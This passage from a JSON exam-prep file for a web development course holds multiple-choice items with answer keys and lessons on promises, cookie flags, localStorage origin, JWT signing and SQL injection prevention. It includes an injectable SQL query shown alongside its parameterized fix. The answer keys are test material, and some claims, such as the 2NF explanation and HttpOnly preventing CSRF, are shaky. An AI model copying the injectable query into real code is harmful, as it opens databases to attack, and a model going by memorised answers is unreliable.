promise-based wrapper, not a syntax transformation; `await` can be used with `query()` on the wrapper. Choice D incorrectly describes `con.promise()` as creating a new socket; it wraps the same underlying connection.\n","bloom":"apply","source":"Slide 11"},{"id":"nodejs-db-connect-q-01","type":"MCQ","topic":"Node.js MySQL connection: setup, query, and hosting","marks":2,"question":"A student writes this Node.js file and runs it with `node server.js`. The process crashes immediately with `Error: Cannot find module 'mysql'`.\n\n```js\nconst mysql = require('mysql');\nconst con = mysql.createConnection({\n  host: 'localhost', user: 'root', password: '', database: 'mydb'\n});\ncon.connect(function(err) {\n  if (err) throw err;\n  console.log('Connected!');\n});\n```\n\nWhat is the cause, and what is the fix?\n","choices":["`mysql` is a built-in Node.js module that must be enabled via a config flag; run `node --enable-mysql server.js`","The `createConnection` call is missing the `port` property; add `port: 3306` to the config object","`mysql` is an external package not bundled with Node.js; run `npm install mysql` in the project directory before requiring it","The `require` path is wrong; use `require('./mysql')` to load a local module"],"correct":2,"rationale":"`mysql` is not a built-in Node.js module. Built-in modules — `http`, `fs`, `path`, `url`, `os` — are available immediately via `require`. The `mysql` package must be installed from npm before it can be required; missing that step causes Node.js to search `node_modules/` and fail with \"Cannot find module\". The fix is `npm install mysql` in the project directory. Choice A is false — Node.js has no flag that enables a missing external package; built-in modules do not require flags. Choice B is a plausible distractor because `port` is a real `createConnection` option, but omitting it does not cause a module-not-found crash — MySQL defaults to port 3306. Choice D targets the misconception that `require` without a relative path means a local file; bare module names like `'mysql'` resolve to `node_modules/`, not to a local file, so the fix is installing the package, not changing the path.\n","bloom":"understand","source":"Slide 5, Slide 7, Quiz 7"},{"id":"api-documentation-q-01","type":"MCQ","topic":"OpenAPI / Swagger — swagger.json structure and purpose","marks":2,"question":"A developer generates a `swagger.json` file for a RESTful API.\nWhich of the following does this file document?\n","choices":["The server's deployment configuration including environment variables and port bindings","The API's endpoint paths, HTTP methods, request parameters, response schemas, and authentication requirements","The source code of each route handler so consumers can read the implementation","The database schema including table names and column types used by the API"],"correct":1,"rationale":"A `swagger.json` file is an OpenAPI / Swagger Interface Description Language document that\nrecords the external contract of a REST API: the endpoint paths (e.g., `/patients`), their\nsupported HTTP methods (GET, POST, PUT, DELETE), request parameters (path params, query\nparams, headers), request body schemas (shape of JSON payloads), response schemas and status\ncodes for each outcome, and authentication requirements per endpoint. It does not describe\ndeployment internals or implementation details. Option A describes server configuration\n(environment variables, ports) — that belongs in deployment manifests or `.env` files, not\nin an API specification. Option C describes source code documentation (e.g., inline comments\nor JSDoc), not an interface contract; swagger.json describes what the API accepts and returns,\nnot how it is implemented. Option D describes database schema documentation (e.g., an ERD or\nmigration file) — the storage layer is not part of the API surface that Swagger documents.\n","bloom":"remember","source":"Slide 11"}]},"lessons":[{"n":0,"id":"COMP4537-exam-strategy","title":"Exam strategy and top pitfalls — COMP 4537","hook":"Time allocation, top pitfalls, when to skip.","tags":["strategy","exam-prep"],"module":"Exam prep","kind":"strategy","source":"ISAQuiz1–12.pdf; courses/COMP4537/materials/notes/exam-details.md; Slide 1–12","blocks":[{"kind":"h2","html":"Exam format","text":"Exam format"},{"kind":"p","html":"The final exam runs in-person via Learning Hub (laptop required). Format is a mix of multiple-choice questions (MCQ) and written/short-answer questions. One double-sided printed cheat sheet (letter-size) is permitted. No electronic notes, no internet access beyond the Learning Hub quiz interface.","text":"The final exam runs in-person via Learning Hub (laptop required). Format is a mix of multiple-choice questions (MCQ) and written/short-answer questions. One double-sided printed cheat sheet (letter-size) is permitted. No electronic notes, no internet access beyond the Learning Hub quiz interface."},{"kind":"p","html":"No solution keys for past quizzes exist in extractable form — the pitfalls below are derived from wrong-answer patterns observed across ISAQuiz1–12, where scored attempts reveal which answers were selected incorrectly.","text":"No solution keys for past quizzes exist in extractable form — the pitfalls below are derived from wrong-answer patterns observed across ISAQuiz1–12, where scored attempts reveal which answers were selected incorrectly."},{"kind":"h2","html":"Time allocation","text":"Time allocation"},{"kind":"p","html":"There is no published per-question time limit for the final. Use quiz benchmarks to calibrate:","text":"There is no published per-question time limit for the final. Use quiz benchmarks to calibrate:"},{"kind":"table","html":"\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eQuestion type\u003c/th\u003e\n\u003cth\u003eTypical time budget\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\u003ctr\u003e\n\u003ctd\u003eStraightforward MCQ (definition recall)\u003c/td\u003e\n\u003ctd\u003e30–45 s\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eCode-trace MCQ (predict output, trace execution order)\u003c/td\u003e\n\u003ctd\u003e60–90 s\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eWritten/short-answer (explain a mechanism)\u003c/td\u003e\n\u003ctd\u003e2–3 min\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eWritten/short-answer requiring code (e.g. parameterized query)\u003c/td\u003e\n\u003ctd\u003e3–4 min\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\u003c/table\u003e"},{"kind":"p","html":"The quizzes average 1 question per minute under timed conditions (e.g. Quiz 6: 17 questions / ~5 min actual, or Quiz 12: 12 questions / 4 min). Expect the final to be more deliberate — budget 1.5 min per MCQ on average.","text":"The quizzes average 1 question per minute under timed conditions (e.g. Quiz 6: 17 questions / ~5 min actual, or Quiz 12: 12 questions / 4 min). Expect the final to be more deliberate — budget 1.5 min per MCQ on average."},{"kind":"p","html":"Prioritize written questions that touch the top-5 exam topics (httponly-cookies, jwt, promises-basics, db-relational-design, ajax-cors) — these are highest-weight and highest-difficulty. Secure those marks first if you can choose question order.","text":"Prioritize written questions that touch the top-5 exam topics (httponly-cookies, jwt, promises-basics, db-relational-design, ajax-cors) — these are highest-weight and highest-difficulty. Secure those marks first if you can choose question order."},{"kind":"h2","html":"When to skip and return","text":"When to skip and return"},{"kind":"p","html":"Skip any code-trace question that requires more than two full mental passes in under 60 seconds. Mark it, move on, and return after easier questions. Returning with fresh working memory reduces off-by-one errors in execution order tracing.","text":"Skip any code-trace question that requires more than two full mental passes in under 60 seconds. Mark it, move on, and return after easier questions. Returning with fresh working memory reduces off-by-one errors in execution order tracing."},{"kind":"p","html":"Skip a written question if you can&#39;t produce the mechanism in the first sentence — a blank answer scores the same as a wrong one. Return time allowing.","text":"Skip a written question if you can't produce the mechanism in the first sentence — a blank answer scores the same as a wrong one. Return time allowing."},{"kind":"p","html":"Do not skip MCQ questions with a clear distractor you can eliminate — partial elimination is faster than a full cold solve.","text":"Do not skip MCQ questions with a clear distractor you can eliminate — partial elimination is faster than a full cold solve."},{"kind":"h2","html":"Part-structure strategy","text":"Part-structure strategy"},{"kind":"p","html":"The available materials show no evidence of a distinct Part 1 / Part 2 split with separate instructions. Treat the exam as a single sequential flow. If the proctor announces a two-part structure not documented in materials, apply the time allocation table above to each part proportionally.","text":"The available materials show no evidence of a distinct Part 1 / Part 2 split with separate instructions. Treat the exam as a single sequential flow. If the proctor announces a two-part structure not documented in materials, apply the time allocation table above to each part proportionally."},{"kind":"h2","html":"Top-5 sourced pitfalls","text":"Top-5 sourced pitfalls"},{"kind":"h3","html":"Pitfall 1 — Promise executor timing: synchronous code wins (ISAQuiz8, Q2 and Q3)","text":"Pitfall 1 — Promise executor timing: synchronous code wins (ISAQuiz8, Q2 and Q3)"},{"kind":"p","html":"The promise executor runs eagerly — immediately when \u003ccode\u003enew Promise(executor)\u003c/code\u003e is called, before any \u003ccode\u003e.then()\u003c/code\u003e is attached and before the next synchronous line. But \u003ccode\u003e.then()\u003c/code\u003e callbacks are dispatched to the microtask queue and run only after the current synchronous call stack empties.","text":"The promise executor runs eagerly — immediately when `new Promise(executor)` is called, before any `.then()` is attached and before the next synchronous line. But `.then()` callbacks are dispatched to the microtask queue and run only after the current synchronous call stack empties."},{"kind":"code","lang":"js","code":"const fn1 = () =\u003e new Promise((resolve, reject) =\u003e {\n  console.log(1);       // runs NOW (eager executor)\n  resolve('success');\n});\nfn1().then((res) =\u003e {\n  console.log(res);     // runs AFTER 'start' (microtask)\n});\nconsole.log('start');   // runs synchronously, before microtask drains"},{"kind":"p","html":"Output: \u003ccode\u003e1\u003c/code\u003e, \u003ccode\u003estart\u003c/code\u003e, \u003ccode\u003esuccess\u003c/code\u003e — not \u003ccode\u003e1\u003c/code\u003e, \u003ccode\u003esuccess\u003c/code\u003e, \u003ccode\u003estart\u003c/code\u003e.","text":"Output: `1`, `start`, `success` — not `1`, `success`, `start`."},{"kind":"p","html":"The trap: students assume \u003ccode\u003e.then()\u003c/code\u003e fires immediately after \u003ccode\u003eresolve()\u003c/code\u003e is called, before the next synchronous statement. It does not. The microtask queue drains only after all synchronous code on the current stack finishes.","text":"The trap: students assume `.then()` fires immediately after `resolve()` is called, before the next synchronous statement. It does not. The microtask queue drains only after all synchronous code on the current stack finishes."},{"kind":"p","html":"A second variant (ISAQuiz8, Q3): if the executor never calls \u003ccode\u003eresolve()\u003c/code\u003e or \u003ccode\u003ereject()\u003c/code\u003e, \u003ccode\u003e.then()\u003c/code\u003e callbacks never run. Output of \u003ccode\u003econsole.log(1); console.log(2);\u003c/code\u003e in executor + \u003ccode\u003e.then(() =&gt; console.log(3)).then(() =&gt; console.log(4));\u003c/code\u003e + \u003ccode\u003econsole.log(5);\u003c/code\u003e is: \u003ccode\u003e1, 2, 5\u003c/code\u003e — the \u003ccode\u003e.then()\u003c/code\u003e chains are silent because the promise stays pending.","text":"A second variant (ISAQuiz8, Q3): if the executor never calls `resolve()` or `reject()`, `.then()` callbacks never run. Output of `console.log(1); console.log(2);` in executor + `.then(() =\u003e console.log(3)).then(() =\u003e console.log(4));` + `console.log(5);` is: `1, 2, 5` — the `.then()` chains are silent because the promise stays pending."},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003eCalling \u003ccode\u003eresolve()\u003c/code\u003e inside the executor does not immediately execute the \u003ccode\u003e.then()\u003c/code\u003e callback. It enqueues it. \u003ccode\u003econsole.log(&#39;start&#39;)\u003c/code\u003e on the next line still runs first.\u003c/p\u003e","text":"Calling `resolve()` inside the executor does not immediately execute the `.then()` callback. It enqueues it. `console.log('start')` on the next line still runs first."},{"kind":"h3","html":"Pitfall 2 — HttpOnly/Secure cookie risks: answer is &quot;all of the above&quot; (ISAQuiz11, Q3 and Q8)","text":"Pitfall 2 — HttpOnly/Secure cookie risks: answer is \"all of the above\" (ISAQuiz11, Q3 and Q8)"},{"kind":"p","html":"Missing the \u003ccode\u003eHttpOnly\u003c/code\u003e flag exposes the cookie to \u003cstrong\u003eXSS\u003c/strong\u003e (JavaScript can read \u003ccode\u003edocument.cookie\u003c/code\u003e), \u003cstrong\u003esession hijacking\u003c/strong\u003e (attacker reads session token), and also facilitates \u003cstrong\u003eCSRF\u003c/strong\u003e (cross-site request forgery) indirectly. The exam distractors isolate one risk (&quot;only XSS&quot; or &quot;only CSRF&quot;) — the correct answer covers all of them.","text":"Missing the `HttpOnly` flag exposes the cookie to **XSS** (JavaScript can read `document.cookie`), **session hijacking** (attacker reads session token), and also facilitates **CSRF** (cross-site request forgery) indirectly. The exam distractors isolate one risk (\"only XSS\" or \"only CSRF\") — the correct answer covers all of them."},{"kind":"p","html":"Concretely from ISAQuiz11 Q8: &quot;What are the potential risks of not using the HTTPOnly and Secure flags for a JWT cookie?&quot; — answer is &quot;All of the above&quot; (XSS exposure, CSRF vulnerability, unauthorized access to sensitive user information). Selecting only &quot;XSS&quot; scores zero.","text":"Concretely from ISAQuiz11 Q8: \"What are the potential risks of not using the HTTPOnly and Secure flags for a JWT cookie?\" — answer is \"All of the above\" (XSS exposure, CSRF vulnerability, unauthorized access to sensitive user information). Selecting only \"XSS\" scores zero."},{"kind":"p","html":"The \u003ccode\u003eSecure\u003c/code\u003e flag protects against transmission over HTTP (cookie only sent on HTTPS). The \u003ccode\u003eHttpOnly\u003c/code\u003e flag blocks JavaScript access. These are orthogonal protections; removing either opens a distinct attack surface.","text":"The `Secure` flag protects against transmission over HTTP (cookie only sent on HTTPS). The `HttpOnly` flag blocks JavaScript access. These are orthogonal protections; removing either opens a distinct attack surface."},{"kind":"callout","variant":"takeaway","html":"\u003cp\u003eWhen the exam asks about cookie security risks, the answer is almost always the most comprehensive option. Flags like \u003ccode\u003eHttpOnly\u003c/code\u003e and \u003ccode\u003eSecure\u003c/code\u003e together close multiple distinct attack vectors — the exam tests whether you see the full picture, not just one layer.\u003c/p\u003e","text":"When the exam asks about cookie security risks, the answer is almost always the most comprehensive option. Flags like `HttpOnly` and `Secure` together close multiple distinct attack vectors — the exam tests whether you see the full picture, not just one layer."},{"kind":"h3","html":"Pitfall 3 — localStorage origin scope: path is irrelevant, subdomain is not (ISAQuiz5, Q2 and Q6)","text":"Pitfall 3 — localStorage origin scope: path is irrelevant, subdomain is not (ISAQuiz5, Q2 and Q6)"},{"kind":"p","html":"localStorage is scoped to the \u003cstrong\u003eorigin\u003c/strong\u003e (protocol + domain + port). All pages sharing the same origin share the same localStorage. Different origins do not.","text":"localStorage is scoped to the **origin** (protocol + domain + port). All pages sharing the same origin share the same localStorage. Different origins do not."},{"kind":"p","html":"\u003cul\u003e\n\u003cli\u003e\u003ccode\u003ehttp://myDomain.com/read.html\u003c/code\u003e, \u003ccode\u003ehttp://myDomain.com/fetch.html\u003c/code\u003e, and \u003ccode\u003ehttp://myDomain.com/get.html\u003c/code\u003e all share the same localStorage — same origin (ISAQuiz5, Q2 correct answer). The path (\u003ccode\u003e/read.html\u003c/code\u003e vs \u003ccode\u003e/fetch.html\u003c/code\u003e) is irrelevant.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ehttps://lab.aaa.com/1/index.html\u003c/code\u003e \u003cstrong\u003ecannot\u003c/strong\u003e access the localStorage of \u003ccode\u003ehttps://aaa.com/labs/1/index.html\u003c/code\u003e — different subdomain = different origin (ISAQuiz5, Q6: student selected \u003ccode\u003elab.aaa.com\u003c/code\u003e, marked wrong).\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ehttps://aaa.com/labs/5/hello.html\u003c/code\u003e \u003cstrong\u003ecan\u003c/strong\u003e access it — same protocol (\u003ccode\u003ehttps\u003c/code\u003e), same domain (\u003ccode\u003eaaa.com\u003c/code\u003e), same port (443 implicit). The path difference (\u003ccode\u003e/labs/1/\u003c/code\u003e vs \u003ccode\u003e/labs/5/\u003c/code\u003e) does not affect origin.\u003c/li\u003e\n\u003c/ul\u003e","text":"- `http://myDomain.com/read.html`, `http://myDomain.com/fetch.html`, and `http://myDomain.com/get.html` all share the same localStorage — same origin (ISAQuiz5, Q2 correct answer). The path (`/read.html` vs `/fetch.html`) is irrelevant.\n- `https://lab.aaa.com/1/index.html` **cannot** access the localStorage of `https://aaa.com/labs/1/index.html` — different subdomain = different origin (ISAQuiz5, Q6: student selected `lab.aaa.com`, marked wrong).\n- `https://aaa.com/labs/5/hello.html` **can** access it — same protocol (`https`), same domain (`aaa.com`), same port (443 implicit). The path difference (`/labs/1/` vs `/labs/5/`) does not affect origin."},{"kind":"p","html":"The trap: assuming localStorage is scoped to a specific URL or that all pages under one domain share storage regardless of protocol. Switching from \u003ccode\u003ehttp://\u003c/code\u003e to \u003ccode\u003ehttps://\u003c/code\u003e creates a different origin even on the same domain.","text":"The trap: assuming localStorage is scoped to a specific URL or that all pages under one domain share storage regardless of protocol. Switching from `http://` to `https://` creates a different origin even on the same domain."},{"kind":"h3","html":"Pitfall 4 — Asymmetric key direction: verify with the SENDER&#39;s public key (ISAQuiz11, Q9)","text":"Pitfall 4 — Asymmetric key direction: verify with the SENDER's public key (ISAQuiz11, Q9)"},{"kind":"p","html":"When Amir sends a message signed with his \u003cstrong\u003eprivate key\u003c/strong\u003e, Tom verifies the signature using \u003cstrong\u003eAmir&#39;s public key\u003c/strong\u003e — not Tom&#39;s private key, not Tom&#39;s public key, not Amir&#39;s private key.","text":"When Amir sends a message signed with his **private key**, Tom verifies the signature using **Amir's public key** — not Tom's private key, not Tom's public key, not Amir's private key."},{"kind":"p","html":"The distractors in ISAQuiz11 Q9 present all four key combinations. The correct answer is &quot;Amir&#39;s Public key.&quot; The reasoning: Amir signs with his private key (only he can produce the signature). Anyone with Amir&#39;s public key can verify the signature. Tom uses Amir&#39;s public key — a key Amir shares openly.","text":"The distractors in ISAQuiz11 Q9 present all four key combinations. The correct answer is \"Amir's Public key.\" The reasoning: Amir signs with his private key (only he can produce the signature). Anyone with Amir's public key can verify the signature. Tom uses Amir's public key — a key Amir shares openly."},{"kind":"p","html":"The trap: students confuse &quot;verify&quot; (uses sender&#39;s public key) with &quot;decrypt&quot; (uses recipient&#39;s private key) or assume the receiver&#39;s keys are involved in verification.","text":"The trap: students confuse \"verify\" (uses sender's public key) with \"decrypt\" (uses recipient's private key) or assume the receiver's keys are involved in verification."},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003eSigning ≠ encrypting. Signing: sender uses their \u003cstrong\u003eprivate\u003c/strong\u003e key → receiver verifies with sender&#39;s \u003cstrong\u003epublic\u003c/strong\u003e key. Encryption for confidentiality: sender uses receiver&#39;s \u003cstrong\u003epublic\u003c/strong\u003e key → receiver decrypts with their own \u003cstrong\u003eprivate\u003c/strong\u003e key. These are different operations with different key directions.\u003c/p\u003e","text":"Signing ≠ encrypting. Signing: sender uses their **private** key → receiver verifies with sender's **public** key. Encryption for confidentiality: sender uses receiver's **public** key → receiver decrypts with their own **private** key. These are different operations with different key directions."},{"kind":"h3","html":"Pitfall 5 — SQL injection: \u003ccode\u003e.replace()\u003c/code\u003e is not a fix; parameterized queries are (ISAQuiz12, Q2)","text":"Pitfall 5 — SQL injection: `.replace()` is not a fix; parameterized queries are (ISAQuiz12, Q2)"},{"kind":"p","html":"Template-literal SQL interpolation is vulnerable:","text":"Template-literal SQL interpolation is vulnerable:"},{"kind":"code","lang":"js","code":"const query = `UPDATE users SET email='${newEmail}' WHERE id=${userId}`;"},{"kind":"p","html":"ISAQuiz12 Q2 presents two &quot;fixes&quot;: one using \u003ccode\u003e.replace()\u003c/code\u003e to remove quotes, another using parameterized queries. The correct answer is the parameterized form:","text":"ISAQuiz12 Q2 presents two \"fixes\": one using `.replace()` to remove quotes, another using parameterized queries. The correct answer is the parameterized form:"},{"kind":"code","lang":"js","code":"const query = 'UPDATE users SET email=? WHERE id=?';\nconst result = database.query(query, [newEmail, userId]);"},{"kind":"p","html":"The \u003ccode\u003e.replace()\u003c/code\u003e approach is marked wrong — it is bypassable (attacker uses other characters or encodings to inject). Only parameterized queries (\u003ccode\u003e?\u003c/code\u003e placeholders with a separate values array) actually prevent SQL injection, because the driver treats substituted values as data, never as SQL syntax.","text":"The `.replace()` approach is marked wrong — it is bypassable (attacker uses other characters or encodings to inject). Only parameterized queries (`?` placeholders with a separate values array) actually prevent SQL injection, because the driver treats substituted values as data, never as SQL syntax."},{"kind":"h2","html":"Domain-specific traps (off-by-one, ordering, unit)","text":"Domain-specific traps (off-by-one, ordering, unit)"},{"kind":"p","html":"\u003cstrong\u003ereadyState is 0–4, not 1–5.\u003c/strong\u003e \u003ccode\u003e0=UNSENT, 1=OPENED, 2=HEADERS_RECEIVED, 3=LOADING, 4=DONE\u003c/code\u003e. DONE is 4, not 5. (Source: Slide 5, Quiz 6.)","text":"**readyState is 0–4, not 1–5.** `0=UNSENT, 1=OPENED, 2=HEADERS_RECEIVED, 3=LOADING, 4=DONE`. DONE is 4, not 5. (Source: Slide 5, Quiz 6.)"},{"kind":"p","html":"\u003cstrong\u003e\u003ccode\u003elet\u003c/code\u003e block scope causes ReferenceError outside the block.\u003c/strong\u003e A \u003ccode\u003elet\u003c/code\u003e declared inside \u003ccode\u003eif (condition) { let a = ...; }\u003c/code\u003e is not accessible after the closing brace. This is not the same as \u003ccode\u003evar\u003c/code\u003e, which hoists to function scope. ISAQuiz6 Q5: accessing a block-scoped \u003ccode\u003elet\u003c/code\u003e outside its block throws \u003ccode\u003eUncaught ReferenceError: a is Not defined\u003c/code\u003e. (Source: ISAQuiz6, Q5.)","text":"**`let` block scope causes ReferenceError outside the block.** A `let` declared inside `if (condition) { let a = ...; }` is not accessible after the closing brace. This is not the same as `var`, which hoists to function scope. ISAQuiz6 Q5: accessing a block-scoped `let` outside its block throws `Uncaught ReferenceError: a is Not defined`. (Source: ISAQuiz6, Q5.)"},{"kind":"p","html":"\u003cstrong\u003eFunction without \u003ccode\u003ereturn\u003c/code\u003e logs \u003ccode\u003eundefined\u003c/code\u003e.\u003c/strong\u003e \u003ccode\u003econsole.log(foo(3))\u003c/code\u003e where \u003ccode\u003efoo\u003c/code\u003e has no \u003ccode\u003ereturn\u003c/code\u003e statement prints \u003ccode\u003eundefined\u003c/code\u003e, not the last computed value. ISAQuiz6 Q6: \u003ccode\u003efunction foo(n) { var s = 0; for (...) { s += i; } }\u003c/code\u003e → \u003ccode\u003econsole.log(foo(3))\u003c/code\u003e → \u003ccode\u003eundefined\u003c/code\u003e. (Source: ISAQuiz6, Q6.)","text":"**Function without `return` logs `undefined`.** `console.log(foo(3))` where `foo` has no `return` statement prints `undefined`, not the last computed value. ISAQuiz6 Q6: `function foo(n) { var s = 0; for (...) { s += i; } }` → `console.log(foo(3))` → `undefined`. (Source: ISAQuiz6, Q6.)"},{"kind":"p","html":"\u003cstrong\u003eJWT structure: header, payload, signature — not body, not certificate.\u003c/strong\u003e ISAQuiz11 Q5 distractors include &quot;Header, Payload, and Certificate&quot; and &quot;Header, Body, and Footer.&quot; The correct structure is header.payload.signature, all Base64url-encoded and dot-separated. (Source: Slide 10, ISAQuiz11, Q5.)","text":"**JWT structure: header, payload, signature — not body, not certificate.** ISAQuiz11 Q5 distractors include \"Header, Payload, and Certificate\" and \"Header, Body, and Footer.\" The correct structure is header.payload.signature, all Base64url-encoded and dot-separated. (Source: Slide 10, ISAQuiz11, Q5.)"},{"kind":"p","html":"\u003cstrong\u003e\u003ccode\u003evar\u003c/code\u003e hoists declaration only, not value.\u003c/strong\u003e In ISAQuiz6 Q4: \u003ccode\u003eif (m=[]) { console.log(&quot;Green&quot;); } ... var m=10;\u003c/code\u003e — \u003ccode\u003evar m\u003c/code\u003e is hoisted so \u003ccode\u003em\u003c/code\u003e exists (as \u003ccode\u003eundefined\u003c/code\u003e) when the \u003ccode\u003eif\u003c/code\u003e runs, and \u003ccode\u003em=[]\u003c/code\u003e is an assignment expression evaluating to \u003ccode\u003e[]\u003c/code\u003e (truthy) — output is \u003ccode\u003eGreen\u003c/code\u003e. Students expect a ReferenceError. (Source: ISAQuiz6, Q4.)","text":"**`var` hoists declaration only, not value.** In ISAQuiz6 Q4: `if (m=[]) { console.log(\"Green\"); } ... var m=10;` — `var m` is hoisted so `m` exists (as `undefined`) when the `if` runs, and `m=[]` is an assignment expression evaluating to `[]` (truthy) — output is `Green`. Students expect a ReferenceError. (Source: ISAQuiz6, Q4.)"},{"kind":"p","html":"\u003cstrong\u003eCartesian join always returns n × m rows.\u003c/strong\u003e \u003ccode\u003eSELECT * FROM Tabel1, Tabel2\u003c/code\u003e always produces \u003ccode\u003en × m\u003c/code\u003e rows regardless of duplicate column names or content. ISAQuiz10 Q6: distractors claim column name collision reduces row count. It does not. (Source: ISAQuiz10, Q6.)","text":"**Cartesian join always returns n × m rows.** `SELECT * FROM Tabel1, Tabel2` always produces `n × m` rows regardless of duplicate column names or content. ISAQuiz10 Q6: distractors claim column name collision reduces row count. It does not. (Source: ISAQuiz10, Q6.)"},{"kind":"p","html":"\u003cstrong\u003e1NF compliance does not imply 2NF compliance in this course.\u003c/strong\u003e ISAQuiz10 Q5: a table with single-valued cells (satisfies 1NF) can still fail 2NF if non-key columns depend on each other rather than solely on the primary key. The professor&#39;s answer for the PersonID/Name/City/Country table is D: &quot;violates 2NF, but complies with 1NF.&quot; (Source: ISAQuiz10, Q5.)","text":"**1NF compliance does not imply 2NF compliance in this course.** ISAQuiz10 Q5: a table with single-valued cells (satisfies 1NF) can still fail 2NF if non-key columns depend on each other rather than solely on the primary key. The professor's answer for the PersonID/Name/City/Country table is D: \"violates 2NF, but complies with 1NF.\" (Source: ISAQuiz10, Q5.)"},{"kind":"callout","variant":"takeaway","html":"\u003cp\u003eThe five named pitfalls account for the majority of the wrong answers observed across ISAQuiz5, 8, 10, 11, and 12. Prioritise: promise execution order (microtask queue), cookie flag coverage (&quot;all of the above&quot;), localStorage origin scope (subdomain ≠ same origin), asymmetric key direction (verify with sender&#39;s public key), and parameterized queries (\u003ccode\u003e.replace()\u003c/code\u003e does not prevent SQL injection). These five areas, plus the domain-specific traps table, cover the highest-density wrong-answer patterns in the course.\u003c/p\u003e","text":"The five named pitfalls account for the majority of the wrong answers observed across ISAQuiz5, 8, 10, 11, and 12. Prioritise: promise execution order (microtask queue), cookie flag coverage (\"all of the above\"), localStorage origin scope (subdomain ≠ same origin), asymmetric key direction (verify with sender's public key), and parameterized queries (`.replace()` does not prevent SQL injection). These five areas, plus the domain-specific traps table, cover the highest-density wrong-answer patterns in the course."}]},{"n":1,"id":"httponly-cookies","title":"HttpOnly cookies — token auth flow and cookie flags","hook":"Your session token is one JavaScript call away from being stolen — unless you set this flag.","tags":["HttpOnly","cookies","token","SameSite","Secure","XSS","withCredentials"],"module":"API Security","source":"Slide 9, Slide 10, ISAQuiz11","blocks":[{"kind":"p","html":"Imagine your login page stores the session token in \u003ccode\u003elocalStorage\u003c/code\u003e. Any injected script — from a malicious ad, a forum post, or a compromised dependency — runs \u003ccode\u003elocalStorage.getItem(&#39;token&#39;)\u003c/code\u003e and ships your token to an attacker&#39;s server. The server never knew anything happened. The HttpOnly cookie flag closes this attack surface completely: the browser holds the token, JavaScript cannot read it, and the browser sends it automatically on every same-origin request.","text":"Imagine your login page stores the session token in `localStorage`. Any injected script — from a malicious ad, a forum post, or a compromised dependency — runs `localStorage.getItem('token')` and ships your token to an attacker's server. The server never knew anything happened. The HttpOnly cookie flag closes this attack surface completely: the browser holds the token, JavaScript cannot read it, and the browser sends it automatically on every same-origin request."},{"kind":"h2","html":"The token auth flow","text":"The token auth flow"},{"kind":"p","html":"After the server validates credentials at \u003ccode\u003ePOST /login\u003c/code\u003e, it responds with a \u003ccode\u003eSet-Cookie\u003c/code\u003e header rather than a JSON body containing the token. The browser stores the cookie and attaches it to every subsequent request to the same origin — without any JavaScript involvement.","text":"After the server validates credentials at `POST /login`, it responds with a `Set-Cookie` header rather than a JSON body containing the token. The browser stores the cookie and attaches it to every subsequent request to the same origin — without any JavaScript involvement."},{"kind":"mermaid","source":"sequenceDiagram\n    participant Browser\n    participant Server\n\n    Browser-\u003e\u003eServer: POST /login (username + password)\n    Server-\u003e\u003eServer: Validate credentials, generate token\n    Server--\u003e\u003eBrowser: 200 OK + Set-Cookie: token=abc123; HttpOnly; Path=/; SameSite=None; Secure; Max-Age=60\n    Note over Browser: Browser stores cookie. JavaScript cannot read it.\n\n    Browser-\u003e\u003eServer: GET /profile (Cookie: token=abc123 auto-attached)\n    Server-\u003e\u003eServer: Read cookie, validate session\n    Server--\u003e\u003eBrowser: 200 OK + profile data\n\n    Browser-\u003e\u003eServer: POST /logout\n    Server--\u003e\u003eBrowser: 200 OK + Set-Cookie: token=; HttpOnly; Path=/; Max-Age=0; SameSite=None; Secure\n    Note over Browser: Browser deletes cookie immediately."},{"kind":"p","html":"The server reads the cookie on every protected request. If the session is valid, it processes the request. If not, it returns \u003ccode\u003e401 Unauthorized\u003c/code\u003e.","text":"The server reads the cookie on every protected request. If the session is valid, it processes the request. If not, it returns `401 Unauthorized`."},{"kind":"h2","html":"Cookie flags and what each one does","text":"Cookie flags and what each one does"},{"kind":"h3","html":"HttpOnly","text":"HttpOnly"},{"kind":"p","html":"Setting \u003ccode\u003eHttpOnly\u003c/code\u003e blocks \u003ccode\u003edocument.cookie\u003c/code\u003e access in the browser. Any JavaScript on the page — including injected scripts from Cross-Site Scripting (XSS) attacks — cannot read the token value. The browser still sends the cookie automatically on every HTTP request to the setting origin.","text":"Setting `HttpOnly` blocks `document.cookie` access in the browser. Any JavaScript on the page — including injected scripts from Cross-Site Scripting (XSS) attacks — cannot read the token value. The browser still sends the cookie automatically on every HTTP request to the setting origin."},{"kind":"h3","html":"Secure","text":"Secure"},{"kind":"p","html":"The \u003ccode\u003eSecure\u003c/code\u003e flag restricts the cookie to HTTPS connections only. Over plain HTTP, the browser refuses to send the cookie. This prevents token interception on unencrypted networks.","text":"The `Secure` flag restricts the cookie to HTTPS connections only. Over plain HTTP, the browser refuses to send the cookie. This prevents token interception on unencrypted networks."},{"kind":"h3","html":"SameSite","text":"SameSite"},{"kind":"p","html":"SameSite controls whether the browser sends the cookie on cross-origin requests:","text":"SameSite controls whether the browser sends the cookie on cross-origin requests:"},{"kind":"p","html":"\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003eSameSite=Strict\u003c/code\u003e\u003c/strong\u003e — browser only sends the cookie on same-origin requests. Cross-site navigations (clicking a link from another site) do not include the cookie.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003eSameSite=Lax\u003c/code\u003e\u003c/strong\u003e — browser sends the cookie on same-origin requests and on top-level navigations (clicking a link), but not on cross-origin subresource requests like XHR or fetch.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003eSameSite=None\u003c/code\u003e\u003c/strong\u003e — browser sends the cookie on all requests, including cross-origin. Requires \u003ccode\u003eSecure\u003c/code\u003e to also be set; without \u003ccode\u003eSecure\u003c/code\u003e, the browser rejects the \u003ccode\u003eSameSite=None\u003c/code\u003e directive.\u003c/li\u003e\n\u003c/ul\u003e","text":"- **`SameSite=Strict`** — browser only sends the 